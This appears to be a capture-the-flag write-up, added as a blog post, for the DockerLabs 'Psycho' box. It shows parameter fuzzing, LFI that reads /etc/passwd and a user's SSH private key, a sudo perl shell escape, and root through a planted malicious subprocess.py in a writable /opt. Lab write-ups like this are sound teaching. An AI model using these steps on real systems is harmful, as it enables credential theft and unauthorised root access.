@@ -1,0 +1,272 @@
+---
+title: "Psycho from Dockerlabs"
+author: ferbot
+date: 2025-09-06 23:00:00 +0800
+categories: [dockerlabs, linux]
+tags: [dockerlabs, easy, param, lfi, sudo, python]
+description: Easy box from DockerLabs
+---
+
+### Dockerlabs: Psycho
+
+This box was a bit tricky at the start. I couldn't figure out at the start how to get RCE but once I found the LFI vulnerability it was quite straightforward. The privilege escalation part I have seen somewhere else (probably a machine from HTB) so it was a nice reminder. Overall a fun box.
+
+### Before we start
+
+Before we start it's good to take a look at the box or challenge's description. You might find something key to progress through the challenge. In this case the box's description mentioned the use of service enumeration, LFI exploitation, SSH key exfiltration and sudo privilege escalation.
+
+It kind of spoils some of the techniques to be used to root the box but it's still nice to see in case I get stuck.
+
+### Initial enumeration
+
+As always I started with an nmap scan, the result was as follows.
+
+```bash
+Nmap scan report for 172.17.0.2
+Host is up (0.0000080s latency).
+Not shown: 65533 closed tcp ports (reset)
+PORT   STATE SERVICE VERSION
+22/tcp open  ssh     OpenSSH 9.6p1 Ubuntu 3ubuntu13.4 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey: 
+|   256 38:bb:36:a4:18:60:ee:a8:d1:0a:61:97:6c:83:06:05 (ECDSA)
+|_  256 a3:4e:4f:6f:76:f2:ba:50:c6:1a:54:40:95:9c:20:41 (ED25519)
+80/tcp open  http    Apache httpd 2.4.58 ((Ubuntu))
+|_http-title: 4You
+| http-methods: 
+|_  Supported Methods: GET HEAD POST OPTIONS
+|_http-server-header: Apache/2.4.58 (Ubuntu)
+MAC Address: 02:42:AC:11:00:02 (Unknown)
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+```
+
+After opening the website a login page is shown.
+
+![placeholder](/assets/img/dockerlabs/psycho/psycho-main-page.png "LFI etc-passwd")
+
+After hammering the application for a while I looked for a nudge on how to proceed and encountered a hint about parameter enumeration.
+
+This was also a bit evident in an error shown in the end of the `index.php` page.
+
+![placeholder](/assets/img/dockerlabs/psycho/dockerlabs-psycho-param-missing.png "Missing parameter")
+
+This is a common error for PHP. Since I was not very familiar with this kind of errors I opted for the nudge.
+
+### Secret parameter
+
+I then proceeded to enumerate using `FFUF`:
+
+```bash
+$ ffuf -c -ic -u 'http://172.17.0.2/index.php?FUZZ' -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -fc 200
+
+        /'___\  /'___\           /'___\       
+       /\ \__/ /\ \__/  __  __  /\ \__/       
+       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
+        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
+         \ \_\   \ \_\  \ \____/  \ \_\       
+          \/_/    \/_/   \/___/    \/_/       
+
+       v2.1.0-dev
+________________________________________________
+
+ :: Method           : GET
+ :: URL              : http://172.17.0.2/index.php?FUZZ
+ :: Wordlist         : FUZZ: /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
+ :: Follow redirects : false
+ :: Calibration      : false
+ :: Timeout          : 10
+ :: Threads          : 40
+ :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
+ :: Filter           : Response status: 200
+________________________________________________
+
+secret                  [Status: 500, Size: 2582, Words: 671, Lines: 63, Duration: 0ms]
+:: Progress: [220547/220547] :: Job [1/1] :: 8000 req/sec :: Duration: [0:00:25] :: Errors: 0 ::
+```
+
+After a while I was able to find a parameter called `secret`. Which after trying to access a common linux internal file (`/etc/passwd`) I got the following server response.
+
+![placeholder](/assets/img/dockerlabs/psycho/dockerlabs-psycho-lfi.png "LFI etc-passwd")
+
+Now I can search for openssh keys `id_rsa`. And we find the one for the user vaxei.
+
+<!-- > An example showing the `tip` type prompt.
+{: .prompt-tip } -->
+
+I can then copy the SSH key into my own box and format it correctly using the following commands:
+
+```bash
+$ dos2unix vaxei_id_rsa
+dos2unix: converting file vaxei_id_rsa to Unix format...
+$ vim --clean vaxei_id_rsa
+```
+
+Then once inside vim write `:wq` and it's done.
+
+```bash
+$ ssh vaxei@172.17.0.2 -i vaxei_id_rsa
+The authenticity of host '172.17.0.2 (172.17.0.2)' can't be established.
+ED25519 key fingerprint is SHA256:KZdmmK93JpQdEgEdRl0JYVD4l+Gdfix6KM9aUmZc1lA.
+This key is not known by any other names.
+Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
+Warning: Permanently added '172.17.0.2' (ED25519) to the list of known hosts.
+Welcome to Ubuntu 24.04 LTS (GNU/Linux 6.11.2-amd64 x86_64)
+
+ * Documentation:  https://help.ubuntu.com
+ * Management:     https://landscape.canonical.com
+ * Support:        https://ubuntu.com/pro
+
+This system has been minimized by removing packages and content that are
+not required on a system that users do not log into.
+
+To restore this content, you can run the 'unminimize' command.
+Last login: Sat Aug 10 02:25:09 2024 from 172.17.0.1
+vaxei@a1ecaf130795:~$ 
+```
+
+### Horizontal escalation
+
+Since I got password for the `vaxei` user, I can verify the privileges (if any) our user has.
+
+```bash
+vaxei@a1ecaf130795:~$ sudo -ln
+Matching Defaults entries for vaxei on a1ecaf130795:
+    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty
+
+User vaxei may run the following commands on a1ecaf130795:
+    (luisillo) NOPASSWD: /usr/bin/perl
+vaxei@a1ecaf130795:~$ 
+```
+
+We can run **perl** as `luisillo`. After checking on [GTFObins](https://gtfobins.github.io/gtfobins/perl/), we can abuse this privilege and obtain a shell as `luisillo` following the next step:
+
+```bash
+vaxei@a1ecaf130795:~$ sudo -u luisillo /usr/bin/perl -e 'exec "/bin/sh";'
+$ whoami
+luisillo
+$ 
+```
+
+### Sudo again?
+
+As the description initially suggested, this is about sudo exploitation. So I see once again what sudo privileges I have now as **luisillo**.
+
+```bash
+$ sudo -ln
+Matching Defaults entries for luisillo on a1ecaf130795:
+    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty
+
+User luisillo may run the following commands on a1ecaf130795:
+    (ALL) NOPASSWD: /usr/bin/python3 /opt/paw.py
+$ 
+```
+
+I can execute the `/opt/paw.py` script as root. Let's check out this python script.
+
+```python
+import subprocess
+import os
+import sys
+import time
+
+# F
+def dummy_function(data):
+    result = ""
+    for char in data:
+        result += char.upper() if char.islower() else char.lower()
+    return result
+
+# Código para ejecutar el script
+os.system("echo Ojo Aqui")
+
+# Simulación de procesamiento de datos
+def data_processing():
+    data = "This is some dummy data that needs to be processed."
+    processed_data = dummy_function(data)
+    print(f"Processed data: {processed_data}")
+
+# Simulación de un cálculo inútil
+def perform_useless_calculation():
+    result = 0
+    for i in range(1000000):
+        result += i
+    print(f"Useless calculation result: {result}")
+
+def run_command():
+    subprocess.run(['echo Hello!'], check=True)
+
+def main():
+    # Llamadas a funciones que no afectan el resultado final
+    data_processing()
+    perform_useless_calculation()
+    
+    # Comando real que se ejecuta
+    run_command()
+
+if __name__ == "__main__":
+    main()
+```
+
+Taking an extra look into the python script I can see its privileges.
+
+```bash
+-rw-r--r-- 1 root root  967 Aug 10  2024 paw.py
+```
+
+I can't modify the `paw.py` script.
+
+
+<!-- ```bash
+$ ls -la /usr/lib/ | grep python
+drwxr-xr-x  3 root root 4096 Aug 10  2024 python3
+drwxr-xr-x 32 root root 4096 Aug 10  2024 python3.12
+```
+ -->
+
+### Paw-Privilege
+
+I ran the script to see what happens:
+
+```bash
+sudo /usr/bin/python3 /opt/paw.py
+Ojo Aqui
+Processed data: tHIS IS SOME DUMMY DATA THAT NEEDS TO BE PROCESSED.
+Useless calculation result: 499999500000
+Traceback (most recent call last):
+  File "/opt/paw.py", line 41, in <module>
+    main()
+  File "/opt/paw.py", line 38, in main
+    run_command()
+  File "/opt/paw.py", line 30, in run_command
+    subprocess.run(['echo Hello!'], check=True)
+  File "/usr/lib/python3.12/subprocess.py", line 548, in run
+    with Popen(*popenargs, **kwargs) as process:
+         ^^^^^^^^^^^^^^^^^^^^^^^^^^^
+  File "/usr/lib/python3.12/subprocess.py", line 1026, in __init__
+    self._execute_child(args, executable, preexec_fn, close_fds,
+  File "/usr/lib/python3.12/subprocess.py", line 1955, in _execute_child
+    raise child_exception_type(errno_num, err_msg, err_filename)
+FileNotFoundError: [Errno 2] No such file or directory: 'echo Hello!'
+```
+
+There seems to be a problem importing the **subprocess.py** library.
+
+On a closer inspection on the `/opt/` folder:
+
+```shell
+drwxr-xrwx   1 root root 4096 Aug 10  2024 opt
+```
+
+I can see my any user has write privileges on `/opt/`. Meaning I can insert a malicious python library file and the script will try to import it because of the python hierarchy for libraries.
+
+
+```bash
+$ echo 'import os; os.system("/bin/bash")' > subprocess.py
+$ sudo /usr/bin/python3 /opt/paw.py
+root@a1ecaf130795:/opt# whoami; id
+root
+uid=0(root) gid=0(root) groups=0(root)
+root@a1ecaf130795:/opt#
+```
+
+I get root!
+
